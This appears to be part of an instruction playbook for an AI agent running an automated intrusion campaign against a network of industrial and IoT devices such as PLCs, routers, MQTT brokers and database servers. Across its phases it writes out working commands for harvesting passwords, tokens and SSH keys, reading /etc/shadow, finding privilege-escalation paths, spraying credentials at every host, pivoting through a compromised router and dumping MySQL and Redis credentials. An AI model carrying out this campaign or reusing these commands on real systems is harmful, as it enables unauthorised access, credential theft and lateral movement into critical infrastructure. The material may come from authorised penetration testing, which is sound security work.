## Phase A — Load context (turns 1-2)

1. read_deliverable("05_intrusion_context.json")
   → gives you: entry_points, all_targets, recovered_credentials, attack_chains

2. read_deliverable("04_exploitation.json")
   → gives you: confirmed exploits with raw evidence (passwords, keys, banners)

Build your internal state:
- `compromised`: set of {ip, user, password} — devices you have access to
- `credential_pool`: all recovered credentials + any you harvest during the campaign
- `target_queue`: all IPs from all_targets, ordered by role (db > plc > router > ssh_server > others)

## Phase B — Initial access (turns 3-15)

For each entry_point in entry_points:
1. try_credential(ip, "ssh", user, password) for each credential in credential_pool
2. On first success → add to `compromised`, run post-exploitation immediately (Phase C)
3. If SSH fails, try http/ftp/mqtt if relevant services are listed

If no credential works on an entry point → skip it, try next.

## Phase C — Post-exploitation on each compromised host

Run ALL of these commands via ssh_exec on every newly compromised device:

```
# Identity & privileges
id && whoami && hostname

# Harvest credentials from common locations
grep -r 'pass\|pwd\|password\|secret\|key\|token' /etc /home /opt /var/www 2>/dev/null | grep -v Binary | grep -v '.pyc' | head -40

# Environment variables (API keys, DB passwords)
env | grep -iE 'pass|pwd|key|secret|token|auth'

# MQTT broker password files
cat /etc/mosquitto/passwd 2>/dev/null; cat /etc/mosquitto/mosquitto.conf 2>/dev/null

# Database credentials and app configs
find /var/www /opt /home -name '.env' -o -name 'config.json' -o -name 'settings.py' 2>/dev/null | xargs cat 2>/dev/null | head -60

# SSH keys that could unlock other devices
find /root /home -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null | head -5

# Network — what other devices can this host reach?
ip route; cat /etc/hosts; arp -n 2>/dev/null

# Running services
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null

# Privilege escalation — SUID binaries and writable cron
find / -perm -4000 -type f 2>/dev/null | grep -v '/proc\|/sys' | head -20
ls -la /etc/cron* /var/spool/cron 2>/dev/null; find /etc/cron.d /etc/cron.daily /etc/cron.weekly -writable 2>/dev/null | head -10
```

Extract EVERY credential found → add to `credential_pool`.
If SUID binaries outside /bin/su, /usr/bin/passwd, /usr/bin/sudo are found, document in `data_exfiltrated` as potential privilege escalation vector.
Note every new IP discovered → add to `target_queue` if not already there.

## Phase D — Credential spraying (systematic)

After harvesting from a compromised host:
1. Take ALL newly found credentials
2. Try them against EVERY device in all_targets that is NOT yet compromised
3. Prioritize: db_server, plc, historian, router, then others
4. For each successful login → immediately run Phase C on the new host

This is the core loop. Repeat Phase C → Phase D → Phase C → Phase D...
Continue until no new devices are accessible OR turn 70.

---

## Phase D2 — Pivot via compromised router/gateway (MANDATORY)

If you have compromised a **router** or **gateway**:
1. Run a quick internal port scan FROM the compromised device to discover reachable hosts:
   ```
   ssh_exec(router_ip, user, password, "for ip in $(seq 1 30); do (ping -c1 -W1 192.168.100.$ip &>/dev/null && echo 192.168.100.$ip up) & done; wait")
   ```
2. Try SSH to every discovered IP directly (not just IPs from entry_points):
   ```
   try_credential("192.168.100.X", "ssh", user, password)
   ```
3. For DB servers (port 3306): try MySQL directly:
   ```
   ssh_exec(router_ip, user, password, "mysql -h 192.168.100.X -uroot --connect-timeout=3 -e 'SHOW DATABASES;' 2>/dev/null")
   ```
4. For Redis servers (port 6379): probe via router:
   ```
   ssh_exec(router_ip, user, password, "redis-cli -h 192.168.100.X --no-auth-warning KEYS '*' 2>/dev/null | head -20")
   ```

**CRITICAL for chain visualization**: For EVERY hop where you pivot from device A to device B,
set `pivot_to` in device A's hop entry to device B's IP. This is what draws the attack chain
on the topology graph. A hop with `pivot_to: null` is a dead end — always set it to the NEXT
device you moved to, or to the crown jewel you reached via this host.

## Phase E — Crown jewel targeting

Crown jewels (highest priority):
- `db_server` / MySQL / Redis → ssh_exec(ip, u, p, "mysql -uroot -e 'SELECT user,password FROM mysql.user;' 2>/dev/null || redis-cli KEYS '*' 2>/dev/null")
- `plc` / Modbus → note as reached (no destructive writes)
- `router` / `gateway` → ssh_exec(ip, u, p, "cat /etc/config/network 2>/dev/null; iptables -L 2>/dev/null; cat /etc/openvpn/*.conf 2>/dev/null")
- Any device → ssh_exec(ip, u, p, "cat /etc/shadow 2>/dev/null | head -20")

For each crown jewel reached, document access method and data retrieved.

**Build long chains**: A single-hop intrusion (only the entry point) is incomplete.
Keep chaining until: all_targets exhausted OR credential spraying fails everywhere OR turn 70.
